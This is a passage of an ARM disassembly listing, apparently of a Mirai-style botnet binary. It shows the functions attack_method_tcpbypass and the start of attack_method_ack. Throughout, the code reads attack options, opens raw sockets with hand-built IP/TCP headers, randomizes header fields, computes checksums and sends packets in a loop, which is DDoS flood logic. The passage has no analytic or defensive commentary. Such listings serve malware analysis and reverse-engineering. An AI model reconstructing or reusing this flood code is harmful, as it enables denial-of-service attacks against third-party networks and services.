    bc1c:	e58dc050 	str	ip, [sp, #80]	; 0x50
    bc20:	ebfff9c6 	bl	a340 <attack_get_opt_int>
    bc24:	e3a03801 	mov	r3, #65536	; 0x10000
    bc28:	e1a0c000 	mov	ip, r0
    bc2c:	e20cc0ff 	and	ip, ip, #255	; 0xff
    bc30:	e2433001 	sub	r3, r3, #1
    bc34:	e3a02006 	mov	r2, #6
    bc38:	e1a01005 	mov	r1, r5
    bc3c:	e1a00004 	mov	r0, r4
    bc40:	e58dc054 	str	ip, [sp, #84]	; 0x54
    bc44:	ebfff9bd 	bl	a340 <attack_get_opt_int>
    bc48:	e3a03801 	mov	r3, #65536	; 0x10000
    bc4c:	e1a01005 	mov	r1, r5
    bc50:	e2433001 	sub	r3, r3, #1
    bc54:	e3a02007 	mov	r2, #7
    bc58:	e1a0b000 	mov	fp, r0
    bc5c:	e1a00004 	mov	r0, r4
    bc60:	ebfff9b6 	bl	a340 <attack_get_opt_int>
    bc64:	e3a03801 	mov	r3, #65536	; 0x10000
    bc68:	e1a01005 	mov	r1, r5
    bc6c:	e2433001 	sub	r3, r3, #1
    bc70:	e3a02011 	mov	r2, #17
    bc74:	e1a06000 	mov	r6, r0
    bc78:	e1a00004 	mov	r0, r4
    bc7c:	ebfff9af 	bl	a340 <attack_get_opt_int>
    bc80:	e1a01005 	mov	r1, r5
    bc84:	e58d0028 	str	r0, [sp, #40]	; 0x28
    bc88:	e3a02012 	mov	r2, #18
    bc8c:	e3a03000 	mov	r3, #0
    bc90:	e1a00004 	mov	r0, r4
    bc94:	ebfff9a9 	bl	a340 <attack_get_opt_int>
    bc98:	e1a01005 	mov	r1, r5
    bc9c:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    bca0:	e3a0200b 	mov	r2, #11
    bca4:	e3a03000 	mov	r3, #0
    bca8:	e1a00004 	mov	r0, r4
    bcac:	ebfff9a3 	bl	a340 <attack_get_opt_int>
    bcb0:	e1a01005 	mov	r1, r5
    bcb4:	e58d0030 	str	r0, [sp, #48]	; 0x30
    bcb8:	e3a0200c 	mov	r2, #12
    bcbc:	e3a03000 	mov	r3, #0
    bcc0:	e1a00004 	mov	r0, r4
    bcc4:	ebfff99d 	bl	a340 <attack_get_opt_int>
    bcc8:	e1a01005 	mov	r1, r5
    bccc:	e58d0034 	str	r0, [sp, #52]	; 0x34
    bcd0:	e3a0200d 	mov	r2, #13
    bcd4:	e3a03000 	mov	r3, #0
    bcd8:	e1a00004 	mov	r0, r4
    bcdc:	ebfff997 	bl	a340 <attack_get_opt_int>
    bce0:	e1a01005 	mov	r1, r5
    bce4:	e58d0038 	str	r0, [sp, #56]	; 0x38
    bce8:	e3a0200e 	mov	r2, #14
    bcec:	e3a03000 	mov	r3, #0
    bcf0:	e1a00004 	mov	r0, r4
    bcf4:	ebfff991 	bl	a340 <attack_get_opt_int>
    bcf8:	e1a01005 	mov	r1, r5
    bcfc:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    bd00:	e3a0200f 	mov	r2, #15
    bd04:	e3a03000 	mov	r3, #0
    bd08:	e1a00004 	mov	r0, r4
    bd0c:	ebfff98b 	bl	a340 <attack_get_opt_int>
    bd10:	e1a01005 	mov	r1, r5
    bd14:	e58d0040 	str	r0, [sp, #64]	; 0x40
    bd18:	e3a02010 	mov	r2, #16
    bd1c:	e3a03000 	mov	r3, #0
    bd20:	e1a00004 	mov	r0, r4
    bd24:	ebfff985 	bl	a340 <attack_get_opt_int>
    bd28:	e59f2508 	ldr	r2, [pc, #1288]	; c238 <attack_method_tcpbypass+0x6a8>
    bd2c:	e58d0044 	str	r0, [sp, #68]	; 0x44
    bd30:	e5923000 	ldr	r3, [r2]
    bd34:	e1a01005 	mov	r1, r5
    bd38:	e3a02019 	mov	r2, #25
    bd3c:	e1a00004 	mov	r0, r4
    bd40:	ebfff963 	bl	a2d4 <attack_get_opt_ip>
    bd44:	e3a01003 	mov	r1, #3
    bd48:	e58d0060 	str	r0, [sp, #96]	; 0x60
    bd4c:	e3a02006 	mov	r2, #6
    bd50:	e3a00002 	mov	r0, #2
    bd54:	eb002cbe 	bl	17054 <__GI_socket>
    bd58:	e3700001 	cmn	r0, #1
    bd5c:	e1a0a000 	mov	sl, r0
    bd60:	0a000131 	beq	c22c <attack_method_tcpbypass+0x69c>
    bd64:	e28d3070 	add	r3, sp, #112	; 0x70
    bd68:	e3a02001 	mov	r2, #1
    bd6c:	e5232004 	str	r2, [r3, #-4]!
    bd70:	e3a0c004 	mov	ip, #4
    bd74:	e3a01000 	mov	r1, #0
    bd78:	e2822002 	add	r2, r2, #2
    bd7c:	e58dc000 	str	ip, [sp]
    bd80:	eb002ca1 	bl	1700c <__GI_setsockopt>
    bd84:	e3700001 	cmn	r0, #1
    bd88:	0a000125 	beq	c224 <attack_method_tcpbypass+0x694>
    bd8c:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    bd90:	e3a02000 	mov	r2, #0
    bd94:	e1a00801 	lsl	r0, r1, #16
    bd98:	e1a0480b 	lsl	r4, fp, #16
    bd9c:	e1a05806 	lsl	r5, r6, #16
    bda0:	e58d206c 	str	r2, [sp, #108]	; 0x6c
    bda4:	e59d2030 	ldr	r2, [sp, #48]	; 0x30
    bda8:	e1a03820 	lsr	r3, r0, #16
    bdac:	e1a06824 	lsr	r6, r4, #16
    bdb0:	e1a01825 	lsr	r1, r5, #16
    bdb4:	e3570000 	cmp	r7, #0
    bdb8:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    bdbc:	e58d6058 	str	r6, [sp, #88]	; 0x58
    bdc0:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    bdc4:	e202b0ff 	and	fp, r2, #255	; 0xff
    bdc8:	0a000092 	beq	c018 <attack_method_tcpbypass+0x488>
    bdcc:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    bdd0:	e1a0e803 	lsl	lr, r3, #16
    bdd4:	e1a03c06 	lsl	r3, r6, #24
    bdd8:	e59d604c 	ldr	r6, [sp, #76]	; 0x4c
    bddc:	e1a02c01 	lsl	r2, r1, #24
    bde0:	e1a0140e 	lsl	r1, lr, #8
    bde4:	e1a01821 	lsr	r1, r1, #16
    bde8:	e1a00c20 	lsr	r0, r0, #24
    bdec:	e206c0ff 	and	ip, r6, #255	; 0xff
    bdf0:	e181ec2e 	orr	lr, r1, lr, lsr #24
    bdf4:	e180c40c 	orr	ip, r0, ip, lsl #8
    bdf8:	e28d0030 	add	r0, sp, #48	; 0x30
    bdfc:	e8900003 	ldm	r0, {r0, r1}
    be00:	e1a03823 	lsr	r3, r3, #16
    be04:	e1a02822 	lsr	r2, r2, #16
    be08:	e2000001 	and	r0, r0, #1
    be0c:	e2011001 	and	r1, r1, #1
    be10:	e1836c24 	orr	r6, r3, r4, lsr #24
    be14:	e1825c25 	orr	r5, r2, r5, lsr #24
    be18:	e58d000c 	str	r0, [sp, #12]
    be1c:	e58d1010 	str	r1, [sp, #16]
    be20:	e28d2038 	add	r2, sp, #56	; 0x38
    be24:	e892000c 	ldm	r2, {r2, r3}
    be28:	e28d0040 	add	r0, sp, #64	; 0x40
    be2c:	e8900003 	ldm	r0, {r0, r1}
    be30:	e2022001 	and	r2, r2, #1
    be34:	e2033001 	and	r3, r3, #1
    be38:	e2000001 	and	r0, r0, #1
    be3c:	e2011001 	and	r1, r1, #1
    be40:	e58de064 	str	lr, [sp, #100]	; 0x64
    be44:	e58dc008 	str	ip, [sp, #8]
    be48:	e58d2014 	str	r2, [sp, #20]
    be4c:	e58d3018 	str	r3, [sp, #24]
    be50:	e58d001c 	str	r0, [sp, #28]
    be54:	e58d1020 	str	r1, [sp, #32]
    be58:	e3a04000 	mov	r4, #0
    be5c:	e3a01001 	mov	r1, #1
    be60:	e3a00080 	mov	r0, #128	; 0x80
    be64:	eb002f5c 	bl	17bdc <calloc>
    be68:	e59d206c 	ldr	r2, [sp, #108]	; 0x6c
    be6c:	e7890104 	str	r0, [r9, r4, lsl #2]
    be70:	e1a03282 	lsl	r3, r2, #5
    be74:	e7994102 	ldr	r4, [r9, r2, lsl #2]
    be78:	e0433182 	sub	r3, r3, r2, lsl #3
    be7c:	e0830008 	add	r0, r3, r8
    be80:	e5d43000 	ldrb	r3, [r4]
    be84:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    be88:	e3833040 	orr	r3, r3, #64	; 0x40
    be8c:	e5c43000 	strb	r3, [r4]
    be90:	e5d42000 	ldrb	r2, [r4]
    be94:	e3c2200a 	bic	r2, r2, #10
    be98:	e3822005 	orr	r2, r2, #5
    be9c:	e59d3054 	ldr	r3, [sp, #84]	; 0x54
    bea0:	e5c42000 	strb	r2, [r4]
    bea4:	e59d1048 	ldr	r1, [sp, #72]	; 0x48
    bea8:	e5c41001 	strb	r1, [r4, #1]
    beac:	e59d2050 	ldr	r2, [sp, #80]	; 0x50
    beb0:	e3530000 	cmp	r3, #0
    beb4:	e3a03b0f 	mov	r3, #15360	; 0x3c00
    beb8:	e5c42008 	strb	r2, [r4, #8]
    bebc:	e1c430b2 	strh	r3, [r4, #2]
    bec0:	e3a03006 	mov	r3, #6
    bec4:	e59d1008 	ldr	r1, [sp, #8]
    bec8:	13a02040 	movne	r2, #64	; 0x40
    becc:	e5c43009 	strb	r3, [r4, #9]
    bed0:	11c420b6 	strhne	r2, [r4, #6]
    bed4:	e59d2060 	ldr	r2, [sp, #96]	; 0x60
    bed8:	e584200c 	str	r2, [r4, #12]
    bedc:	e5903010 	ldr	r3, [r0, #16]
    bee0:	e1c410b4 	strh	r1, [r4, #4]
    bee4:	e5843010 	str	r3, [r4, #16]
    bee8:	e1c461b4 	strh	r6, [r4, #20]
    beec:	e2841014 	add	r1, r4, #20
    bef0:	e5d1300c 	ldrb	r3, [r1, #12]
    bef4:	e5d1200d 	ldrb	r2, [r1, #13]
    bef8:	e59d000c 	ldr	r0, [sp, #12]
    befc:	e3c33050 	bic	r3, r3, #80	; 0x50
    bf00:	e38330a0 	orr	r3, r3, #160	; 0xa0
    bf04:	e3c22020 	bic	r2, r2, #32
    bf08:	e5c1300c 	strb	r3, [r1, #12]
    bf0c:	e1822280 	orr	r2, r2, r0, lsl #5
    bf10:	e59d3064 	ldr	r3, [sp, #100]	; 0x64
    bf14:	e5c1200d 	strb	r2, [r1, #13]
    bf18:	e5813004 	str	r3, [r1, #4]
    bf1c:	e5d1300d 	ldrb	r3, [r1, #13]
    bf20:	e59d0010 	ldr	r0, [sp, #16]
    bf24:	e3c33010 	bic	r3, r3, #16
    bf28:	e1833200 	orr	r3, r3, r0, lsl #4
    bf2c:	e5c1300d 	strb	r3, [r1, #13]
    bf30:	e5d1200d 	ldrb	r2, [r1, #13]
    bf34:	e59d3014 	ldr	r3, [sp, #20]
    bf38:	e3c22008 	bic	r2, r2, #8
    bf3c:	e1822183 	orr	r2, r2, r3, lsl #3
    bf40:	e1c150b2 	strh	r5, [r1, #2]
    bf44:	e5c1200d 	strb	r2, [r1, #13]
    bf48:	e5d1300d 	ldrb	r3, [r1, #13]
    bf4c:	e59d0018 	ldr	r0, [sp, #24]
    bf50:	e3c33004 	bic	r3, r3, #4
    bf54:	e1833100 	orr	r3, r3, r0, lsl #2
    bf58:	e5c1300d 	strb	r3, [r1, #13]
    bf5c:	e5d1200d 	ldrb	r2, [r1, #13]
    bf60:	e59d301c 	ldr	r3, [sp, #28]
    bf64:	e3c22002 	bic	r2, r2, #2
    bf68:	e1822083 	orr	r2, r2, r3, lsl #1
    bf6c:	e5c1200d 	strb	r2, [r1, #13]
    bf70:	e5d1300d 	ldrb	r3, [r1, #13]
    bf74:	e59d0020 	ldr	r0, [sp, #32]
    bf78:	e3c33001 	bic	r3, r3, #1
    bf7c:	e1803003 	orr	r3, r0, r3
    bf80:	e5c1300d 	strb	r3, [r1, #13]
    bf84:	e3a02004 	mov	r2, #4
    bf88:	e3a01002 	mov	r1, #2
    bf8c:	e5c41028 	strb	r1, [r4, #40]	; 0x28
    bf90:	e5c42029 	strb	r2, [r4, #41]	; 0x29
    bf94:	eb001997 	bl	125f8 <rand_next>
    bf98:	e200000f 	and	r0, r0, #15
    bf9c:	e2800e57 	add	r0, r0, #1392	; 0x570
    bfa0:	e2800008 	add	r0, r0, #8
    bfa4:	e1a00800 	lsl	r0, r0, #16
    bfa8:	e1a03420 	lsr	r3, r0, #8
    bfac:	e2033cff 	and	r3, r3, #65280	; 0xff00
    bfb0:	e1833c20 	orr	r3, r3, r0, lsr #24
    bfb4:	e1c432ba 	strh	r3, [r4, #42]	; 0x2a
    bfb8:	e3a03004 	mov	r3, #4
    bfbc:	e5c4302c 	strb	r3, [r4, #44]	; 0x2c
    bfc0:	e3a0200a 	mov	r2, #10
    bfc4:	e3a03008 	mov	r3, #8
    bfc8:	e3a00002 	mov	r0, #2
    bfcc:	e5c4302e 	strb	r3, [r4, #46]	; 0x2e
    bfd0:	e5c4202f 	strb	r2, [r4, #47]	; 0x2f
    bfd4:	e5c4002d 	strb	r0, [r4, #45]	; 0x2d
    bfd8:	eb001986 	bl	125f8 <rand_next>
    bfdc:	e3a02006 	mov	r2, #6
    bfe0:	e5c4203b 	strb	r2, [r4, #59]	; 0x3b
    bfe4:	e3a01003 	mov	r1, #3
    bfe8:	e3a03000 	mov	r3, #0
    bfec:	e3a02001 	mov	r2, #1
    bff0:	e5840030 	str	r0, [r4, #48]	; 0x30
    bff4:	e5843034 	str	r3, [r4, #52]	; 0x34
    bff8:	e5c42038 	strb	r2, [r4, #56]	; 0x38
    bffc:	e5c4103a 	strb	r1, [r4, #58]	; 0x3a
    c000:	e5c41039 	strb	r1, [r4, #57]	; 0x39
    c004:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c008:	e0834002 	add	r4, r3, r2
    c00c:	e1540007 	cmp	r4, r7
    c010:	e58d406c 	str	r4, [sp, #108]	; 0x6c
    c014:	baffff90 	blt	be5c <attack_method_tcpbypass+0x2cc>
    c018:	e3a03000 	mov	r3, #0
    c01c:	e3570000 	cmp	r7, #0
    c020:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    c024:	0afffffb 	beq	c018 <attack_method_tcpbypass+0x488>
    c028:	e1a00003 	mov	r0, r3
    c02c:	e1a03280 	lsl	r3, r0, #5
    c030:	e0433180 	sub	r3, r3, r0, lsl #3
    c034:	e0833008 	add	r3, r3, r8
    c038:	e5d32014 	ldrb	r2, [r3, #20]
    c03c:	e7995100 	ldr	r5, [r9, r0, lsl #2]
    c040:	e352001f 	cmp	r2, #31
    c044:	e2856014 	add	r6, r5, #20
    c048:	9a00003b 	bls	c13c <attack_method_tcpbypass+0x5ac>
    c04c:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    c050:	e3730001 	cmn	r3, #1
    c054:	0a000050 	beq	c19c <attack_method_tcpbypass+0x60c>
    c058:	e3a04801 	mov	r4, #65536	; 0x10000
    c05c:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    c060:	e2444001 	sub	r4, r4, #1
    c064:	e1500004 	cmp	r0, r4
    c068:	0a000052 	beq	c1b8 <attack_method_tcpbypass+0x628>
    c06c:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    c070:	e1510004 	cmp	r1, r4
    c074:	0a000054 	beq	c1cc <attack_method_tcpbypass+0x63c>
    c078:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    c07c:	e1520004 	cmp	r2, r4
    c080:	0a000056 	beq	c1e0 <attack_method_tcpbypass+0x650>
    c084:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    c088:	e1530004 	cmp	r3, r4
    c08c:	0a000058 	beq	c1f4 <attack_method_tcpbypass+0x664>
    c090:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    c094:	e1500004 	cmp	r0, r4
    c098:	0a00005a 	beq	c208 <attack_method_tcpbypass+0x678>
    c09c:	e35b0000 	cmp	fp, #0
    c0a0:	1a00005c 	bne	c218 <attack_method_tcpbypass+0x688>
    c0a4:	e3a01000 	mov	r1, #0
    c0a8:	e1c510ba 	strh	r1, [r5, #10]
    c0ac:	e1a00005 	mov	r0, r5
    c0b0:	e3a01014 	mov	r1, #20
    c0b4:	eb0009ed 	bl	e870 <checksum_generic>
    c0b8:	e3a02000 	mov	r2, #0
    c0bc:	e1c500ba 	strh	r0, [r5, #10]
    c0c0:	e1a01006 	mov	r1, r6
    c0c4:	e1c621b0 	strh	r2, [r6, #16]
    c0c8:	e3a03028 	mov	r3, #40	; 0x28
    c0cc:	e3a02b0a 	mov	r2, #10240	; 0x2800
    c0d0:	e1a00005 	mov	r0, r5
    c0d4:	eb0009f9 	bl	e8c0 <checksum_tcpudp>
    c0d8:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c0dc:	e1a0e283 	lsl	lr, r3, #5
    c0e0:	e1c601b0 	strh	r0, [r6, #16]
    c0e4:	e04ee183 	sub	lr, lr, r3, lsl #3
    c0e8:	e1d660b2 	ldrh	r6, [r6, #2]
    c0ec:	e08ee008 	add	lr, lr, r8
    c0f0:	e1ce60b2 	strh	r6, [lr, #2]
    c0f4:	e3a03901 	mov	r3, #16384	; 0x4000
    c0f8:	e3a0c010 	mov	ip, #16
    c0fc:	e1a01005 	mov	r1, r5
    c100:	e1a0000a 	mov	r0, sl
    c104:	e3a0203c 	mov	r2, #60	; 0x3c
    c108:	e58de000 	str	lr, [sp]
    c10c:	e58dc004 	str	ip, [sp, #4]
    c110:	eb002b9b 	bl	16f84 <__libc_sendto>
    c114:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c118:	e2830001 	add	r0, r3, #1
    c11c:	e1500007 	cmp	r0, r7
    c120:	e58d006c 	str	r0, [sp, #108]	; 0x6c
    c124:	baffffc0 	blt	c02c <attack_method_tcpbypass+0x49c>
    c128:	e3a03000 	mov	r3, #0
    c12c:	e3570000 	cmp	r7, #0
    c130:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    c134:	0affffb7 	beq	c018 <attack_method_tcpbypass+0x488>
    c138:	eaffffba 	b	c028 <attack_method_tcpbypass+0x498>
    c13c:	e5934010 	ldr	r4, [r3, #16]
    c140:	eb00192c 	bl	125f8 <rand_next>
    c144:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c148:	e1a01283 	lsl	r1, r3, #5
    c14c:	e0411183 	sub	r1, r1, r3, lsl #3
    c150:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    c154:	e1a02c24 	lsr	r2, r4, #24
    c158:	e182242c 	orr	r2, r2, ip, lsr #8
    c15c:	e0811008 	add	r1, r1, r8
    c160:	e2043cff 	and	r3, r4, #65280	; 0xff00
    c164:	e5d1c014 	ldrb	ip, [r1, #20]
    c168:	e1822403 	orr	r2, r2, r3, lsl #8
    c16c:	e1822c04 	orr	r2, r2, r4, lsl #24
    c170:	e0822c30 	add	r2, r2, r0, lsr ip
    c174:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    c178:	e1a03c22 	lsr	r3, r2, #24
    c17c:	e1833420 	orr	r3, r3, r0, lsr #8
    c180:	e2021cff 	and	r1, r2, #65280	; 0xff00
    c184:	e1833401 	orr	r3, r3, r1, lsl #8
    c188:	e1833c02 	orr	r3, r3, r2, lsl #24
    c18c:	e5853010 	str	r3, [r5, #16]
    c190:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    c194:	e3730001 	cmn	r3, #1
    c198:	1affffae 	bne	c058 <attack_method_tcpbypass+0x4c8>
    c19c:	eb001915 	bl	125f8 <rand_next>
    c1a0:	e3a04801 	mov	r4, #65536	; 0x10000
    c1a4:	e585000c 	str	r0, [r5, #12]
    c1a8:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    c1ac:	e2444001 	sub	r4, r4, #1
    c1b0:	e1500004 	cmp	r0, r4
    c1b4:	1affffac 	bne	c06c <attack_method_tcpbypass+0x4dc>
    c1b8:	eb00190e 	bl	125f8 <rand_next>
    c1bc:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    c1c0:	e1510004 	cmp	r1, r4
    c1c4:	e1c500b4 	strh	r0, [r5, #4]
    c1c8:	1affffaa 	bne	c078 <attack_method_tcpbypass+0x4e8>
    c1cc:	eb001909 	bl	125f8 <rand_next>
    c1d0:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    c1d4:	e1520004 	cmp	r2, r4
    c1d8:	e1c501b4 	strh	r0, [r5, #20]
    c1dc:	1affffa8 	bne	c084 <attack_method_tcpbypass+0x4f4>
    c1e0:	eb001904 	bl	125f8 <rand_next>
    c1e4:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    c1e8:	e1530004 	cmp	r3, r4
    c1ec:	e1c600b2 	strh	r0, [r6, #2]
    c1f0:	1affffa6 	bne	c090 <attack_method_tcpbypass+0x500>
    c1f4:	eb0018ff 	bl	125f8 <rand_next>
    c1f8:	e5860004 	str	r0, [r6, #4]
    c1fc:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    c200:	e1500004 	cmp	r0, r4
    c204:	1affffa4 	bne	c09c <attack_method_tcpbypass+0x50c>
    c208:	eb0018fa 	bl	125f8 <rand_next>
    c20c:	e35b0000 	cmp	fp, #0
    c210:	e5860008 	str	r0, [r6, #8]
    c214:	0affffa2 	beq	c0a4 <attack_method_tcpbypass+0x514>
    c218:	eb0018f6 	bl	125f8 <rand_next>
    c21c:	e1c601b2 	strh	r0, [r6, #18]
    c220:	eaffff9f 	b	c0a4 <attack_method_tcpbypass+0x514>
    c224:	e1a0000a 	mov	r0, sl
    c228:	eb003704 	bl	19e40 <__GI___libc_close>
    c22c:	e28dd074 	add	sp, sp, #116	; 0x74
    c230:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    c234:	e12fff1e 	bx	lr
    c238:	0002b8ac 	.word	0x0002b8ac

0000c23c <attack_method_ack>:
    c23c:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    c240:	e1a08001 	mov	r8, r1
    c244:	e24dd084 	sub	sp, sp, #132	; 0x84
    c248:	e3a01004 	mov	r1, #4
    c24c:	e1a04002 	mov	r4, r2
    c250:	e1a05003 	mov	r5, r3
    c254:	e1a07000 	mov	r7, r0
    c258:	eb002e5f 	bl	17bdc <calloc>
    c25c:	e1a01005 	mov	r1, r5
    c260:	e58d0024 	str	r0, [sp, #36]	; 0x24
    c264:	e3a02002 	mov	r2, #2
    c268:	e3a03000 	mov	r3, #0
    c26c:	e1a00004 	mov	r0, r4
    c270:	ebfff832 	bl	a340 <attack_get_opt_int>
    c274:	e3a03801 	mov	r3, #65536	; 0x10000
    c278:	e1a0c000 	mov	ip, r0
    c27c:	e20cc0ff 	and	ip, ip, #255	; 0xff
    c280:	e2433001 	sub	r3, r3, #1
    c284:	e3a02003 	mov	r2, #3
    c288:	e1a01005 	mov	r1, r5
    c28c:	e1a00004 	mov	r0, r4
    c290:	e58dc04c 	str	ip, [sp, #76]	; 0x4c
    c294:	ebfff829 	bl	a340 <attack_get_opt_int>
    c298:	e1a01005 	mov	r1, r5
    c29c:	e3a02004 	mov	r2, #4
    c2a0:	e3a03040 	mov	r3, #64	; 0x40
    c2a4:	e1a09000 	mov	r9, r0
    c2a8:	e1a00004 	mov	r0, r4
    c2ac:	ebfff823 	bl	a340 <attack_get_opt_int>
    c2b0:	e1a0c000 	mov	ip, r0
    c2b4:	e20cc0ff 	and	ip, ip, #255	; 0xff
    c2b8:	e1a01005 	mov	r1, r5
    c2bc:	e3a02005 	mov	r2, #5
    c2c0:	e3a03000 	mov	r3, #0
    c2c4:	e1a00004 	mov	r0, r4
    c2c8:	e58dc054 	str	ip, [sp, #84]	; 0x54
    c2cc:	ebfff81b 	bl	a340 <attack_get_opt_int>
    c2d0:	e3a03801 	mov	r3, #65536	; 0x10000
    c2d4:	e1a0c000 	mov	ip, r0
    c2d8:	e20cc0ff 	and	ip, ip, #255	; 0xff
    c2dc:	e2433001 	sub	r3, r3, #1
    c2e0:	e3a02006 	mov	r2, #6
    c2e4:	e1a01005 	mov	r1, r5
    c2e8:	e1a00004 	mov	r0, r4
    c2ec:	e58dc058 	str	ip, [sp, #88]	; 0x58
    c2f0:	ebfff812 	bl	a340 <attack_get_opt_int>
    c2f4:	e3a03801 	mov	r3, #65536	; 0x10000
    c2f8:	e1a01005 	mov	r1, r5
    c2fc:	e2433001 	sub	r3, r3, #1
    c300:	e3a02007 	mov	r2, #7
    c304:	e1a06000 	mov	r6, r0
    c308:	e1a00004 	mov	r0, r4
    c30c:	ebfff80b 	bl	a340 <attack_get_opt_int>
    c310:	e3a03801 	mov	r3, #65536	; 0x10000
    c314:	e1a01005 	mov	r1, r5
    c318:	e2433001 	sub	r3, r3, #1
    c31c:	e3a02011 	mov	r2, #17
    c320:	e1a0a000 	mov	sl, r0
    c324:	e1a00004 	mov	r0, r4
    c328:	ebfff804 	bl	a340 <attack_get_opt_int>
    c32c:	e3a03801 	mov	r3, #65536	; 0x10000
    c330:	e58d0028 	str	r0, [sp, #40]	; 0x28
    c334:	e1a01005 	mov	r1, r5
    c338:	e2433001 	sub	r3, r3, #1
    c33c:	e3a02012 	mov	r2, #18
    c340:	e1a00004 	mov	r0, r4
    c344:	ebfff7fd 	bl	a340 <attack_get_opt_int>
    c348:	e1a01005 	mov	r1, r5
    c34c:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    c350:	e3a0200b 	mov	r2, #11
    c354:	e3a03000 	mov	r3, #0
    c358:	e1a00004 	mov	r0, r4
    c35c:	ebfff7f7 	bl	a340 <attack_get_opt_int>
    c360:	e1a01005 	mov	r1, r5
    c364:	e58d0030 	str	r0, [sp, #48]	; 0x30
    c368:	e3a0200c 	mov	r2, #12
    c36c:	e3a03001 	mov	r3, #1
    c370:	e1a00004 	mov	r0, r4
    c374:	ebfff7f1 	bl	a340 <attack_get_opt_int>
    c378:	e1a01005 	mov	r1, r5
    c37c:	e58d0034 	str	r0, [sp, #52]	; 0x34
    c380:	e3a0200d 	mov	r2, #13
    c384:	e3a03000 	mov	r3, #0
    c388:	e1a00004 	mov	r0, r4
    c38c:	ebfff7eb 	bl	a340 <attack_get_opt_int>
    c390:	e1a01005 	mov	r1, r5
    c394:	e58d0038 	str	r0, [sp, #56]	; 0x38
    c398:	e3a0200e 	mov	r2, #14
    c39c:	e3a03000 	mov	r3, #0
    c3a0:	e1a00004 	mov	r0, r4
    c3a4:	ebfff7e5 	bl	a340 <attack_get_opt_int>
    c3a8:	e1a01005 	mov	r1, r5
    c3ac:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    c3b0:	e3a0200f 	mov	r2, #15
    c3b4:	e3a03000 	mov	r3, #0
    c3b8:	e1a00004 	mov	r0, r4
    c3bc:	ebfff7df 	bl	a340 <attack_get_opt_int>
    c3c0:	e1a01005 	mov	r1, r5
    c3c4:	e58d0040 	str	r0, [sp, #64]	; 0x40
    c3c8:	e3a02010 	mov	r2, #16
    c3cc:	e3a03000 	mov	r3, #0
    c3d0:	e1a00004 	mov	r0, r4
    c3d4:	ebfff7d9 	bl	a340 <attack_get_opt_int>
    c3d8:	e1a01005 	mov	r1, r5
    c3dc:	e58d0044 	str	r0, [sp, #68]	; 0x44
    c3e0:	e3a02000 	mov	r2, #0
    c3e4:	e3a03c02 	mov	r3, #512	; 0x200
    c3e8:	e1a00004 	mov	r0, r4
    c3ec:	ebfff7d3 	bl	a340 <attack_get_opt_int>
    c3f0:	e3a02001 	mov	r2, #1
    c3f4:	e1a03002 	mov	r3, r2
    c3f8:	e58d0068 	str	r0, [sp, #104]	; 0x68
    c3fc:	e1a01005 	mov	r1, r5
    c400:	e1a00004 	mov	r0, r4
    c404:	ebfff7cd 	bl	a340 <attack_get_opt_int>
    c408:	e59f2520 	ldr	r2, [pc, #1312]	; c930 <attack_method_ack+0x6f4>
    c40c:	e1a0c000 	mov	ip, r0
    c410:	e5923000 	ldr	r3, [r2]
    c414:	e20cc0ff 	and	ip, ip, #255	; 0xff
    c418:	e1a01005 	mov	r1, r5
    c41c:	e3a02019 	mov	r2, #25
    c420:	e1a00004 	mov	r0, r4
    c424:	e58dc06c 	str	ip, [sp, #108]	; 0x6c
    c428:	ebfff7a9 	bl	a2d4 <attack_get_opt_ip>
    c42c:	e3a01003 	mov	r1, #3
    c430:	e58d0070 	str	r0, [sp, #112]	; 0x70
    c434:	e3a02006 	mov	r2, #6
    c438:	e3a00002 	mov	r0, #2
    c43c:	eb002b04 	bl	17054 <__GI_socket>
    c440:	e3700001 	cmn	r0, #1
    c444:	e58d0048 	str	r0, [sp, #72]	; 0x48
    c448:	0a00012e 	beq	c908 <attack_method_ack+0x6cc>
    c44c:	e28d3080 	add	r3, sp, #128	; 0x80
    c450:	e3a02001 	mov	r2, #1
    c454:	e5232004 	str	r2, [r3, #-4]!
    c458:	e3a0c004 	mov	ip, #4
    c45c:	e3a01000 	mov	r1, #0
    c460:	e2822002 	add	r2, r2, #2
    c464:	e58dc000 	str	ip, [sp]
    c468:	eb002ae7 	bl	1700c <__GI_setsockopt>
    c46c:	e3700001 	cmn	r0, #1
    c470:	0a000122 	beq	c900 <attack_method_ack+0x6c4>
    c474:	e1a05809 	lsl	r5, r9, #16
    c478:	e1a06806 	lsl	r6, r6, #16
    c47c:	e1a0a80a 	lsl	sl, sl, #16
    c480:	e3a00000 	mov	r0, #0
    c484:	e1a01825 	lsr	r1, r5, #16
    c488:	e1a02826 	lsr	r2, r6, #16
    c48c:	e1a0382a 	lsr	r3, sl, #16
    c490:	e3570000 	cmp	r7, #0
    c494:	e58d007c 	str	r0, [sp, #124]	; 0x7c
    c498:	e58d1050 	str	r1, [sp, #80]	; 0x50
    c49c:	e58d205c 	str	r2, [sp, #92]	; 0x5c
